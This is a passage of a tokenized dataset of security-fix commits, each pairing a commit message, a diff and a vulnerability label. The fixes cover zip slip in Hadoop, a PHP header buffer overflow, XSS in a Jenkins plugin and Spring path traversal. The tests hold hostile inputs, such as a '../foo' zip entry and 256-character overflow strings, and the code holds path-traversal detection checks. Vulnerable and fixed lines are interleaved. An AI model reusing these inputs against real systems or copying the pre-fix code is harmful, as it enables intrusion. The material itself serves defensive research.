"simple", "zip", "final", "File", "simpleZip", "=", "new", "File", "(", "del", ",", "FILE", ")", ";", "OutputStream", "os", "=", "new", "FileOutputStream", "(", "simpleZip", ")", ";", "ZipOutputStream", "tos", "=", "new", "ZipOutputStream", "(", "os", ")", ";", "@", "@", "-", "728", ",", "7", "+", "728", ",", "7", "@", "@", "public", "void", "testUnZip", "(", ")", "throws", "IOException", "{", "tos", ".", "close", "(", ");", "}", "/", "/", "successfully", "untar", "it", "into", "an", "existing", "dir", ":", "/", "/", "successfully", "unzip", "it", "into", "an", "existing", "dir", ":", "FileUtil", ".", "unZip", "(", "simpleZip", ",", "tmp", ")", ";", "/", "/", "check", "result", ":", "assertTrue", "(", "new", "File", "(", "tmp", ",", "\"", "foo", "\"", ").", "exists", "(", "))", ";", "@", "@", "-", "743", ",", "8", "+", "743", ",", "36", "@", "@", "public", "void", "testUnZip", "(", ")", "throws", "IOException", "{", "}", "catch", "(", "IOException", "ioe", ")", "{", "/", "/", "okay", "}", "}", "}", "@", "Test", "(", "timeout", "=", "30000", ")", "public", "void", "testUnZip2", "(", ")", "throws", "IOException", "{", "setupDirs", "(", ");", "/", "/", "make", "a", "simple", "zip", "final", "File", "simpleZip", "=", "new", "File", "(", "del", ",", "FILE", ")", ";", "OutputStream", "os", "=", "new", "FileOutputStream", "(", "simpleZip", ")", ";", "try", "(", "ZipOutputStream", "tos", "=", "new", "ZipOutputStream", "(", "os", ")", ")", "{", "/", "/", "Add", "an", "entry", "that", "contains", "invalid", "filename", "ZipEntry", "ze", "=", "new", "ZipEntry", "(", "\".", "./", "foo", "\"", ");", "byte", "[", "]", "data", "=", "\"", "some", "-", "content", "\"", ".", "getBytes", "(", "StandardCharsets", ".", "UTF_8", ")", ";", "ze", ".", "setSize", "(", "data", ".", "length", ")", ";", "tos", ".", "putNextEntry", "(", "ze", ")", ";", "tos", ".", "write", "(", "data", ")", ";", "tos", ".", "closeEntry", "(", ");", "tos", ".", "flush", "(", ");", "tos", ".", "finish", "(", ");", "}", "/", "/", "Unzip", "it", "into", "an", "existing", "dir", "try", "{", "FileUtil", ".", "unZip", "(", "simpleZip", ",", "tmp", ")", ";", "Assert", ".", "fail", "(", "\"", "unZip", "should", "throw", "IOException", ".", "\")", ";", "}", "catch", "(", "IOException", "e", ")", "{", "GenericTestUtils", ".", "assertExceptionContains", "(", "\"", "would", "create", "file", "outside", "of", "\"", ",", "e", ")", ";", "}", "}", "@", "Test", "(", "timeout", "=", "30000", ")", "/", "*", "*", "Test", "method", "copy", "(", "FileSystem", "srcFS", ",", "Path", "src", ",", "File", "dst", ",", "boolean", "deleteSource", ",", "Configuration", "conf", ")"], "docstring_tokens": ["zip", "slip"]}
{"contents": ["fix", "bug", "#61807", "-", "Buffer", "Overflow", "in", "apache_request_headers"], "code_tokens": ["@", "@", "-", "1615", ",", "15", "+", "1615", ",", "21", "@", "@", "PHP_FUNCTION", "(", "apache_request_headers", ")", "/", "*", "{", "{{", "*", "/", "p", "=", "var", "+", "5", ";", "var", "=", "q", "=", "t", ";", "/", "/", "First", "char", "keep", "uppercase", "*", "q", "+", "+", "=", "*", "p", "+", "+;", "while", "(", "*", "p", ")", "{", "if", "(", "*", "p", "=", "=", "'", "_", "'", ")", "{", "if", "(", "*", "p", "=", "=", "'", "='", ")", "{", "/", "/", "End", "of", "name", "break", ";", "}", "else", "if", "(", "*", "p", "=", "=", "'", "_", "'", ")", "{", "*", "q", "+", "+", "=", "'", "-'", ";", "p", "+", "+;", "if", "(", "*", "p", ")", "{", "/", "/", "First", "char", "after", "-", "keep", "uppercase", "if", "(", "*", "p", "&", "&", "*", "p", "!", "='", "='", "&", "&", "*", "p", "!", "='", "_", "'", ")", "{", "*", "q", "+", "+", "=", "*", "p", "+", "+;", "}", "}", "else", "if", "(", "*", "p", ">", "=", "'", "A", "'", "&", "&", "*", "p", "<", "=", "'", "Z", "'", ")", "{", "/", "/", "lowercase", "*", "q", "+", "+", "=", "(", "*", "p", "+", "+", "-", "'", "A", "'", "+", "'", "a", "'", ");", "}", "else", "{", "*", "q", "+", "+", "=", "*", "p", "+", "+;", "@", "@", "-", "0", ",", "0", "+", "1", ",", "49", "@", "@", "-", "-", "TEST", "-", "-", "apache_request_headers", "(", ")", "stack", "overflow", ".", "-", "-", "SKIPIF", "-", "-", "<", "?", "php", "include", "\"", "skipif", ".", "inc", "\"", ";", "?", ">", "-", "-", "FILE", "-", "-", "<", "?", "php", "include", "\"", "include", ".", "inc", "\"", ";", "$", "php", "=", "get_cgi_path", "(", ");", "reset_env_vars", "(", ");", "$", "file", "=", "dirname", "(", "__FILE__", ")", ".\"", "/", "012", ".", "test", ".", "php", "\"", ";", "file_put_contents", "(", "$", "file", ",", "'", "<?", "php", "print_r", "(", "apache_request_headers", "(", "))", ";", "?", ">'", ");", "passthru", "(", "\"$", "php", "$", "file", "\"", ");", "$", "names", "=", "array", "(", "'", "HTTP_X_TEST", "'", ",", "'", "HTTP_X__TEST", "'", ",", "'", "HTTP_X_", "'", ");", "foreach", "(", "$", "names", "as", "$", "name", ")", "{", "putenv", "(", "$", "name", ".", "\"=", "\".", "str_repeat", "(", "\"", "A", "\"", ",", "256", ")", ");", "passthru", "(", "\"$", "php", "-", "q", "$", "file", "\"", ");", "putenv", "(", "$", "name", ")", ";", "}", "unlink", "(", "$", "file", ")", ";", "echo", "\"", "Done", "\\", "n", "\"", ";", "?", ">", "-", "-", "EXPECTF", "-", "-", "X", "-", "Powered", "-", "By", ":", "PHP", "/", "%", "s", "Content", "-", "type", ":", "text", "/", "html", "Array", "(", ")", "Array", "(", "[", "X", "-", "Test", "]", "=", ">", "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", ")", "Array", "(", "[", "X", "-", "-", "Test", "]", "=", ">", "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", ")", "Array", "(", "[", "X", "-", "]", "=", ">", "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", ")", "Done"], "docstring_tokens": ["apache_request_headers", "function", "buffer", "overflow"]}
{"contents": ["[SECURITY-992]", "Fix", "for", "security", "issue"], "code_tokens": ["@", "@", "-", "5", ",", "7", "+", "5", ",", "7", "@", "@", "<", "parent", ">", "<", "groupId", ">", "org", ".", "jenkins", "-", "ci", ".", "plugins", "<", "/", "groupId", ">", "<", "artifactId", ">", "plugin", "<", "/", "artifactId", ">", "<", "version", ">", "2", ".", "11", "<", "/", "version", ">", "<", "version", ">", "2", ".", "33", "<", "/", "version", ">", "<", "relativePath", "/", ">", "<", "/", "parent", ">", "<", "groupId", ">", "org", ".", "jenkins", "-", "ci", ".", "plugins", "<", "/", "groupId", ">", "@", "@", "-", "14", ",", "9", "+", "14", ",", "9", "@", "@", "<", "packaging", ">", "hpi", "<", "/", "packaging", ">", "<", "properties", ">", "<", "jenkins", ".", "version", ">", "1", ".", "625", ".", "3", "<", "/", "jenkins", ".", "version", ">", "<", "jenkins", ".", "version", ">", "2", ".", "121", ".", "3", "<", "/", "jenkins", ".", "version", ">", "<", "java", ".", "level", ">", "8", "<", "/", "java", ".", "level", ">", "<", "jenkins", "-", "test", "-", "harness", ".", "version", ">", "2", ".", "13", "<", "/", "jenkins", "-", "test", "-", "harness", ".", "version", ">", "<", "jenkins", "-", "test", "-", "harness", ".", "version", ">", "2", ".", "47", "<", "/", "jenkins", "-", "test", "-", "harness", ".", "version", ">", "<", "disabledTestInjection", ">", "true", "<", "/", "disabledTestInjection", ">", "<", "/", "properties", ">", "@", "@", "-", "8", ",", "7", "+", "8", ",", "9", "@", "@", "import", "org", ".", "kohsuke", ".", "stapler", ".", "StaplerRequest", ";", "import", "java", ".", "io", ".", "IOException", ";", "import", "jenkins", ".", "model", ".", "Jenkins", ";", "import", "org", ".", "jenkinsci", ".", "plugins", ".", "fodupload", ".", "models", ".", "FodEnums", ".", "GrantType", ";", "import", "org", ".", "kohsuke", ".", "stapler", ".", "verb", ".", "POST", ";", "@", "Extension", "public", "class", "FodGlobalDescriptor", "extends", "GlobalConfiguration", "{", "@", "@", "-", "119", ",", "11", "+", "121", ",", "13", "@", "@", "public", "boolean", "getAuthTypeIsPersonalToken", "(", ")", "}", "@", "SuppressWarnings", "(", "{\"", "ThrowableResultOfMethodCallIgnored", "\"", ",", "\"", "unused", "\"", "})", "@", "POST", "public", "FormValidation", "doTestApiKeyConnection", "(", "@", "QueryParameter", "(", "CLIENT_ID", ")", "final", "String", "clientId", ",", "@", "QueryParameter", "(", "CLIENT_SECRET", ")", "final", "String", "clientSecret", ",", "@", "QueryParameter", "(", "BASE_URL", ")", "final", "String", "baseUrl", ",", "@", "QueryParameter", "(", "API_URL", ")", "final", "String", "apiUrl", ")", "{", "Jenkins", ".", "get", "(", ").", "checkPermission", "(", "Jenkins", ".", "ADMINISTER", ")", ";", "FodApiConnection", "testApi", ";", "if", "(", "Utils", ".", "isNullOrEmpty", "(", "baseUrl", ")", ")", "return", "FormValidation", ".", "error", "(", "\"", "Fortify", "on", "Demand", "URL", "is", "empty", "!", "\")", ";", "@", "@", "-", "139", ",", "12", "+", "143", ",", "14", "@", "@", "public", "FormValidation", "doTestApiKeyConnection", "(", "@", "QueryParameter", "(", "CLIENT_ID", ")", "final", "St", "/", "/", "Form", "validation", "@", "SuppressWarnings", "(", "{\"", "ThrowableResultOfMethodCallIgnored", "\"", ",", "\"", "unused", "\"", "})", "@", "POST", "public", "FormValidation", "doTestPersonalAccessTokenConnection", "(", "@", "QueryParameter", "(", "USERNAME", ")", "final", "String", "username", ",", "@", "QueryParameter", "(", "PERSONAL_ACCESS_TOKEN", ")", "final", "String", "personalAccessToken", ",", "@", "QueryParameter", "(", "TENANT_ID", ")", "final", "String", "tenantId", ",", "@", "QueryParameter", "(", "BASE_URL", ")", "final", "String", "baseUrl", ",", "@", "QueryParameter", "(", "API_URL", ")", "final", "String", "apiUrl", ")", "{", "Jenkins", ".", "get", "(", ").", "checkPermission", "(", "Jenkins", ".", "ADMINISTER", ")", ";", "FodApiConnection", "testApi", ";", "if", "(", "Utils", ".", "isNullOrEmpty", "(", "baseUrl", ")", ")", "return", "FormValidation", ".", "error", "(", "\"", "Fortify", "on", "Demand", "URL", "is", "empty", "!", "\")", ";", "@", "@", "-", "26", ",", "9", "+", "26", ",", "11", "@", "@", "import", "java", ".", "io", ".", "IOException", ";", "import", "java", ".", "io", ".", "PrintStream", ";", "import", "java", ".", "net", ".", "URISyntaxException", ";", "import", "jenkins", ".", "model", ".", "Jenkins", ";", "import", "org", ".", "jenkinsci", ".", "plugins", ".", "fodupload", ".", "models", ".", "AuthenticationModel", ";", "import", "org", ".", "jenkinsci", ".", "plugins", ".", "fodupload", ".", "models", ".", "FodEnums", ";", "import", "org", ".", "kohsuke", ".", "stapler", ".", "QueryParameter", ";", "import", "org", ".", "kohsuke", ".", "stapler", ".", "verb", ".", "POST", ";", "@", "SuppressWarnings", "(", "\"", "unused", "\"", ")", "public", "class", "PollingBuildStep", "extends", "Recorder", "implements", "SimpleBuildStep", "{", "@", "@", "-", "206", ",", "9", "+", "208", ",", "9", "@", "@", "public", "String", "getDisplayName", "(", ")", "{", "return", "\"", "Poll", "Fortify", "on", "Demand", "for", "Results", "\"", ";", "}", "public", "FormValidation", "doCheckBsiToken", "(", "@", "QueryParameter", "String", "bsiToken", ")", "{", "Jenkins", ".", "get", "(", ").", "checkPermission", "(", "Jenkins", ".", "ADMINISTER", ")", ";", "if", "(", "bsiToken", "!", "=", "null", "&", "&", "!", "bsiToken", ".", "isEmpty", "(", ")", ")", "{", "BsiTokenParser", "tokenParser", "=", "new", "BsiTokenParser", "(", ");", "try", "{", "@", "@", "-", "246", ",", "10", "+", "248", ",", "12", "@", "@", "public", "FormValidation", "doCheckPollingInterval", "(", "@", "QueryParameter", "String", "pollingInter", "/", "/", "Form", "validation", "@", "SuppressWarnings", "(", "{\"", "ThrowableResultOfMethodCallIgnored", "\"", ",", "\"", "unused", "\"", "})", "@", "SuppressFBWarnings", "(", "\"", "NP_NULL_ON_SOME_PATH_FROM_RETURN_VALUE", "\"", ")", "@", "POST", "public", "FormValidation", "doTestPersonalAccessTokenConnection", "(", "@", "QueryParameter", "(", "USERNAME", ")", "final", "String", "username", ",", "@", "QueryParameter", "(", "PERSONAL_ACCESS_TOKEN", ")", "final", "String", "personalAccessToken", ",", "@", "QueryParameter", "(", "TENANT_ID", ")", "final", "String", "tenantId", ")", "{", "Jenkins", ".", "get", "(", ").", "checkPermission", "(", "Jenkins", ".", "ADMINISTER", ")", ";", "FodApiConnection", "testApi", ";", "String", "baseUrl", "=", "GlobalConfiguration", ".", "all", "(", ").", "get", "(", "FodGlobalDescriptor", ".", "class", ")", ".", "getBaseUrl", "(", ");", "String", "apiUrl", "=", "GlobalConfiguration", ".", "all", "(", ").", "get", "(", "FodGlobalDescriptor", ".", "class", ")", ".", "getApiUrl", "(", ");", "@", "@", "-", "33", ",", "8", "+", "33", ",", "10", "@", "@", "import", "java", ".", "io", ".", "PrintStream", ";", "import", "java", ".", "io", ".", "UnsupportedEncodingException", ";", "import", "java", ".", "net", ".", "URISyntaxException", ";", "import", "jenkins", ".", "model", ".", "Jenkins", ";", "import", "org", ".", "jenkinsci", ".", "plugins", ".", "fodupload", ".", "models", ".", "AuthenticationModel", ";", "import", "org", ".", "kohsuke", ".", "stapler", ".", "QueryParameter", ";", "import", "org", ".", "kohsuke", ".", "stapler", ".", "verb", ".", "POST", ";", "@", "SuppressWarnings", "(", "\"", "unused", "\"", ")", "@", "@", "-", "226", ",", "6", "+", "228", ",", "7", "@", "@", "public", "boolean", "isApplicable", "(", "Class", "<", "?", "extends", "AbstractProject", ">", "aClass", ")", "{", "public", "FormValidation", "doCheckBsiToken", "(", "@", "QueryParameter", "String", "bsiToken", ")", "{", "Jenkins", ".", "get", "(", ").", "checkPermission", "(", "Jenkins", ".", "ADMINISTER", ")", ";", "if", "(", "bsiToken", "!", "=", "null", "&", "&", "!", "bsiToken", ".", "isEmpty", "(", ")", ")", "{", "BsiTokenParser", "tokenParser", "=", "new", "BsiTokenParser", "(", ");", "try", "{", "@", "@", "-", "252", ",", "10", "+", "255", ",", "12", "@", "@", "public", "String", "getDisplayName", "(", ")", "{", "/", "/", "Form", "validation", "@", "SuppressWarnings", "(", "{\"", "ThrowableResultOfMethodCallIgnored", "\"", ",", "\"", "unused", "\"", "})", "@", "SuppressFBWarnings", "(", "\"", "NP_NULL_ON_SOME_PATH_FROM_RETURN_VALUE", "\"", ")", "@", "POST", "public", "FormValidation", "doTestPersonalAccessTokenConnection", "(", "@", "QueryParameter", "(", "USERNAME", ")", "final", "String", "username", ",", "@", "QueryParameter", "(", "PERSONAL_ACCESS_TOKEN", ")", "final", "String", "personalAccessToken", ",", "@", "QueryParameter", "(", "TENANT_ID", ")", "final", "String", "tenantId", ")", "{", "Jenkins", ".", "get", "(", ").", "checkPermission", "(", "Jenkins", ".", "ADMINISTER", ")", ";", "FodApiConnection", "testApi", ";", "String", "baseUrl", "=", "GlobalConfiguration", ".", "all", "(", ").", "get", "(", "FodGlobalDescriptor", ".", "class", ")", ".", "getBaseUrl", "(", ");", "String", "apiUrl", "=", "GlobalConfiguration", ".", "all", "(", ").", "get", "(", "FodGlobalDescriptor", ".", "class", ")", ".", "getApiUrl", "(", ");"], "docstring_tokens": ["cross-site", "scripting", "(xss", ")"]}
{"contents": ["Apply", "extra", "checks", "to", "static", "resource", "handling", "-", "remove", "leading", "'/'", "and", "control", "chars", "-", "improve", "url", "and", "relative", "path", "checks", "-", "account", "for", "URL", "encoding", "-", "add", "isResourceUnderLocation", "final", "verification", "Issue:", "SPR-12354"], "code_tokens": ["@", "@", "-", "18", ",", "7", "+", "18", ",", "10", "@", "@", "import", "java", ".", "io", ".", "IOException", ";", "import", "java", ".", "io", ".", "InputStream", ";", "import", "java", ".", "io", ".", "UnsupportedEncodingException", ";", "import", "java", ".", "net", ".", "URLDecoder", ";", "import", "java", ".", "util", ".", "List", ";", "import", "javax", ".", "activation", ".", "FileTypeMap", ";", "import", "javax", ".", "activation", ".", "MimetypesFileTypeMap", ";", "import", "javax", ".", "servlet", ".", "ServletException", ";", "@", "@", "-", "27", ",", "14", "+", "30", ",", "15", "@", "@", "import", "org", ".", "apache", ".", "commons", ".", "logging", ".", "Log", ";", "import", "org", ".", "apache", ".", "commons", ".", "logging", ".", "LogFactory", ";", "import", "org", ".", "springframework", ".", "beans", ".", "factory", ".", "InitializingBean", ";", "import", "org", ".", "springframework", ".", "core", ".", "io", ".", "ClassPathResource", ";", "import", "org", ".", "springframework", ".", "core", ".", "io", ".", "Resource", ";", "import", "org", ".", "springframework", ".", "core", ".", "io", ".", "UrlResource", ";", "import", "org", ".", "springframework", ".", "http", ".", "MediaType", ";", "import", "org", ".", "springframework", ".", "util", ".", "Assert", ";", "import", "org", ".", "springframework", ".", "util", ".", "ClassUtils", ";", "import", "org", ".", "springframework", ".", "util", ".", "CollectionUtils", ";", "import", "org", ".", "springframework", ".", "util", ".", "ResourceUtils", ";", "import", "org", ".", "springframework", ".", "util", ".", "StreamUtils", ";", "import", "org", ".", "springframework", ".", "util", ".", "StringUtils", ";", "import", "org", ".", "springframework", ".", "web", ".", "HttpRequestHandler", ";", "@", "@", "-", "161", ",", "25", "+", "165", ",", "50", "@", "@", "protected", "Resource", "getResource", "(", "HttpServletRequest", "request", ")", "{", "throw", "new", "IllegalStateException", "(", "\"", "Required", "request", "attribute", "'", "\"", "+", "HandlerMapping", ".", "PATH_WITHIN_HANDLER_MAPPING_ATTRIBUTE", "+", "\"", "'", "is", "not", "set", "\"", ");", "}", "path", "=", "processPath", "(", "path", ")", ";", "if", "(", "!", "StringUtils", ".", "hasText", "(", "path", ")", "|", "|", "isInvalidPath", "(", "path", ")", ")", "{", "if", "(", "logger", ".", "isDebugEnabled", "(", "))", "{", "logger", ".", "debug", "(", "\"", "Ignoring", "invalid", "resource", "path", "[", "\"", "+", "path", "+", "\"", "]\"", ");", "}", "return", "null", ";", "}", "if", "(", "path", ".", "contains", "(", "\"%", "\")", ")", "{", "try", "{", "/", "/", "Use", "URLDecoder", "(", "vs", "UriUtils", ")", "to", "preserve", "potentially", "decoded", "UTF", "-", "8", "chars", "if", "(", "isInvalidPath", "(", "URLDecoder", ".", "decode", "(", "path", ",", "\"", "UTF", "-", "8", "\"", "))", ")", "{", "if", "(", "logger", ".", "isTraceEnabled", "(", "))", "{", "logger", ".", "trace", "(", "\"", "Ignoring", "invalid", "resource", "path", "with", "escape", "sequences", "[", "\"", "+", "path", "+", "\"", "].", "\")", ";", "}", "return", "null", ";", "}", "}", "catch", "(", "UnsupportedEncodingException", "e", ")", "{", "/", "/", "ignore", ":", "shouldn", "'", "t", "happen", "}", "catch", "(", "IllegalArgumentException", "ex", ")", "{", "/", "/", "ignore", "}", "}", "for", "(", "Resource", "location", ":", "this", ".", "locations", ")", "{", "try", "{", "if", "(", "logger", ".", "isDebugEnabled", "(", "))", "{", "logger", ".", "debug", "(", "\"", "Trying", "relative", "path", "[", "\"", "+", "path", "+", "\"", "]", "against", "base", "location", ":", "\"", "+", "location", ")", ";", "}", "Resource", "resource", "=", "location", ".", "createRelative", "(", "path", ")", ";", "if", "(", "resource", ".", "exists", "(", ")", "&", "&", "resource", ".", "isReadable", "(", "))", "{", "if", "(", "logger", ".", "isDebugEnabled", "(", "))", "{", "logger", ".", "debug", "(", "\"", "Found", "matching", "resource", ":", "\"", "+", "resource", ")", ";", "if", "(", "isResourceUnderLocation", "(", "resource", ",", "location", ")", ")", "{", "if", "(", "logger", ".", "isDebugEnabled", "(", "))", "{", "logger", ".", "debug", "(", "\"", "Found", "matching", "resource", ":", "\"", "+", "resource", ")", ";", "}", "return", "resource", ";", "}", "else", "{", "if", "(", "logger", ".", "isTraceEnabled", "(", "))", "{", "logger", ".", "trace", "(", "\"", "resource", "=", "\\\"", "\"", "+", "resource", "+", "\"", "\\\"", "was", "successfully", "resolved", "\"", "\"", "but", "is", "not", "under", "the", "location", "=", "\\\"", "\"", "+", "location", ")", ";", "}", "return", "null", ";", "}", "return", "resource", ";", "}", "else", "if", "(", "logger", ".", "isTraceEnabled", "(", "))", "{", "logger", ".", "trace", "(", "\"", "Relative", "resource", "doesn", "'", "t", "exist", "or", "isn", "'", "t", "readable", ":", "\"", "+", "resource", ")", ";", "@", "@", "-", "193", ",", "14", "+", "222", ",", "110", "@", "@", "else", "if", "(", "logger", ".", "isTraceEnabled", "(", "))", "{", "}", "/", "**", "*", "Validates", "the", "given", "path", ":", "returns", "{", "@", "code", "true", "}", "if", "the", "given", "path", "is", "not", "a", "valid", "resource", "path", ".", "*", "<", "p", ">", "The", "default", "implementation", "rejects", "paths", "containing", "\"", "WEB", "-", "INF", "\"", "or", "\"", "META", "-", "INF", "\"", "as", "well", "as", "paths", "*", "with", "relative", "paths", "(", "\".", "./", "\")", "that", "result", "in", "access", "of", "a", "parent", "directory", ".", "*", "Process", "the", "given", "resource", "path", "to", "be", "used", ".", "*", "<", "p", ">", "The", "default", "implementation", "replaces", "any", "combination", "of", "leading", "'", "/'", "and", "*", "control", "characters", "(", "00", "-", "1F", "and", "7F", ")", "with", "a", "single", "\"", "/\"", "or", "\"", "\".", "For", "example", "*", "{", "@", "code", "\"", "/", "/", "/", "//", "/", "//", "/", "foo", "/", "bar", "\"", "}", "becomes", "{", "@", "code", "\"", "/", "foo", "/", "bar", "\"", "}.", "*", "@", "since", "3", ".", "2", ".", "12", "*", "/", "protected", "String", "processPath", "(", "String", "path", ")", "{", "boolean", "slash", "=", "false", ";", "for", "(", "int", "i", "=", "0", ";", "i", "<", "path", ".", "length", "(", ");", "i", "+", "+)", "{", "if", "(", "path", ".", "charAt", "(", "i", ")", "=", "=", "'", "/'", ")", "{", "slash", "=", "true", ";", "}", "else", "if", "(", "path", ".", "charAt", "(", "i", ")", ">", "'", "'", "&", "&", "path", ".", "charAt", "(", "i", ")", "!", "=", "127", ")", "{", "if", "(", "i", "=", "=", "0", "|", "|", "(", "i", "=", "=", "1", "&", "&", "slash", ")", ")", "{", "return", "path", ";", "}", "path", "=", "slash", "?", "\"", "/\"", "+", "path", ".", "substring", "(", "i", ")", ":", "path", ".", "substring", "(", "i", ")", ";", "if", "(", "logger", ".", "isTraceEnabled", "(", "))", "{", "logger", ".", "trace", "(", "\"", "Path", "trimmed", "for", "leading", "'", "/'", "and", "control", "characters", ":", "\"", "+", "path", ")", ";", "}", "return", "path", ";", "}", "}", "return", "(", "slash", "?", "\"", "/\"", ":", "\"", "\")", ";", "}", "/", "**", "*", "Identifies", "invalid", "resource", "paths", ".", "By", "default", "rejects", ":", "*", "<", "ul", ">", "*", "<", "li", ">", "Paths", "that", "contain", "\"", "WEB", "-", "INF", "\"", "or", "\"", "META", "-", "INF", "\"", "*", "<", "li", ">", "Paths", "that", "contain", "\"", "..", "/\"", "after", "a", "call", "to", "*", "{", "@", "link", "org", ".", "springframework", ".", "util", ".", "StringUtils", "#", "cleanPath", "}", ".", "*", "<", "li", ">", "Paths", "that", "represent", "a", "{", "@", "link", "org", ".", "springframework", ".", "util", ".", "ResourceUtils", "#", "isUrl", "*", "valid", "URL", "}", "or", "would", "represent", "one", "after", "the", "leading", "slash", "is", "removed", ".", "*", "<", "/", "ul", ">", "*", "<", "p", ">", "<", "strong", ">", "Note", ":", "</", "strong", ">", "this", "method", "assumes", "that", "leading", ",", "duplicate", "'", "/'", "*", "or", "control", "characters", "(", "e", ".", "g", ".", "white", "space", ")", "have", "been", "trimmed", "so", "that", "the", "*", "path", "starts", "predictably", "with", "a", "single", "'", "/'", "or", "does", "not", "have", "one", ".", "*", "@", "param", "path", "the", "path", "to", "validate", "*", "@", "return", "{", "@", "code", "true", "}", "if", "the", "path", "has", "been", "recognized", "as", "invalid", ",", "{", "@", "code", "false", "}", "otherwise", "*", "@", "return", "{", "@", "code", "true", "}", "if", "the", "path", "is", "invalid", ",", "{", "@", "code", "false", "}", "otherwise", "*", "/", "protected", "boolean", "isInvalidPath", "(", "String", "path", ")", "{", "return", "(", "path", ".", "contains", "(", "\"", "WEB", "-", "INF", "\"", ")", "|", "|", "path", ".", "contains", "(", "\"", "META", "-", "INF", "\"", ")", "|", "|", "StringUtils", ".", "cleanPath", "(", "path", ")", ".", "startsWith", "(", "\".", ".\"", "))", ";", "if", "(", "logger", ".", "isTraceEnabled", "(", "))", "{", "logger", ".", "trace", "(", "\"", "Applying", "\\", "\"", "invalid", "path", "\\", "\"", "checks", "to", "path", ":", "\"", "+", "path", ")", ";", "}", "if", "(", "path", ".", "contains", "(", "\"", "WEB", "-", "INF", "\"", ")", "|", "|", "path", ".", "contains", "(", "\"", "META", "-", "INF", "\"", "))", "{", "if", "(", "logger", ".", "isTraceEnabled", "(", "))", "{", "logger", ".", "trace", "(", "\"", "Path", "contains", "\\", "\"", "WEB", "-", "INF", "\\", "\"", "or", "\\", "\"", "META", "-", "INF", "\\", "\".", "\")", ";", "}", "return", "true", ";", "}", "if", "(", "path", ".", "contains", "(", "\":", "/\"", "))", "{", "String", "relativePath", "=", "(", "path", ".", "charAt", "(", "0", ")", "=", "=", "'", "/'", "?", "path", ".", "substring", "(", "1", ")", ":", "path", ")", ";", "if", "(", "ResourceUtils", ".", "isUrl", "(", "relativePath", ")", "|", "|", "relativePath", ".", "startsWith", "(", "\"", "url", ":", "\")", ")", "{", "if", "(", "logger", ".", "isTraceEnabled", "(", "))", "{", "logger", ".", "trace", "(", "\"", "Path", "represents", "URL", "or", "has", "\\", "\"", "url", ":", "\\\"", "prefix", ".", "\")", ";", "}", "return", "true", ";", "}", "}", "if", "(", "path", ".", "contains", "(", "\".", "./", "\")", ")", "{", "path", "=", "StringUtils", ".", "cleanPath", "(", "path", ")", ";", "if", "(", "path", ".", "contains", "(", "\".", "./", "\")", ")", "{", "if", "(", "logger", ".", "isTraceEnabled", "(", "))", "{", "logger", ".", "trace", "(", "\"", "Path", "contains", "\\", "\".", "./", "\\\"", "after", "call", "to", "StringUtils", "#", "cleanPath", ".", "\")", ";", "}", "return", "true", ";", "}", "}", "return", "false", ";", "}", "private", "boolean", "isResourceUnderLocation", "(", "Resource", "resource", ",", "Resource", "location", ")", "throws", "IOException", "{", "if", "(", "!", "resource", ".", "getClass", "(", ").", "equals", "(", "location", ".", "getClass", "(", "))", ")", "{", "return", "false", ";", "}", "String", "resourcePath", ";", "String", "locationPath", ";", "if", "(", "resource", "instanceof", "ClassPathResource", ")", "{", "resourcePath", "=", "(", "(", "ClassPathResource", ")", "resource", ")", ".", "getPath", "(", ");", "locationPath", "=", "(", "(", "ClassPathResource", ")", "location", ")", ".", "getPath", "(", ");", "}", "else", "if", "(", "resource", "instanceof", "UrlResource", ")", "{", "resourcePath", "=", "resource", ".", "getURL", "(", ").", "toExternalForm", "(", ");", "locationPath", "=", "location", ".", "getURL", "(", ").", "toExternalForm", "(", ");", "}", "else", "{", "resourcePath", "=", "resource", ".", "getURL", "(", ").", "getPath", "(", ");", "locationPath", "=", "location", ".", "getURL", "(", ").", "getPath", "(", ");", "}", "locationPath", "=", "(", "locationPath", ".", "endsWith", "(", "\"/", "\")", "|", "|", "locationPath", ".", "isEmpty", "(", ")", "?", "locationPath", ":", "locationPath", "+", "\"", "/\"", ");", "if", "(", "!", "resourcePath", ".", "startsWith", "(", "locationPath", ")", ")", "{", "return", "false", ";", "}", "if", "(", "resourcePath", ".", "contains", "(", "\"%", "\")", ")", "{", "/", "/", "Use", "URLDecoder", "(", "vs", "UriUtils", ")", "to", "preserve", "potentially", "decoded", "UTF", "-", "8", "chars", "if", "(", "URLDecoder", ".", "decode", "(", "resourcePath", ",", "\"", "UTF", "-", "8", "\"", ").", "contains", "(", "\".", "./", "\")", ")", "{", "if", "(", "logger", ".", "isTraceEnabled", "(", "))", "{", "logger", ".", "trace", "(", "\"", "Resolved", "resource", "path", "contains", "\\", "\".", "./", "\\\"", "after", "decoding", ":", "\"", "+", "resourcePath", ")", ";", "}", "return", "false", ";", "}", "}", "return", "true", ";", "}", "/", "**", "@", "@", "-", "1", ",", "5", "+", "1", ",", "5", "@", "@", "/", "*", "*", "Copyright", "2002", "-", "2012", "the", "original", "author", "or", "authors", ".", "*", "Copyright", "2002", "-", "2014", "the", "original", "author", "or", "authors", ".", "*", "*", "Licensed", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "(", "the", "\"", "License", "\"", 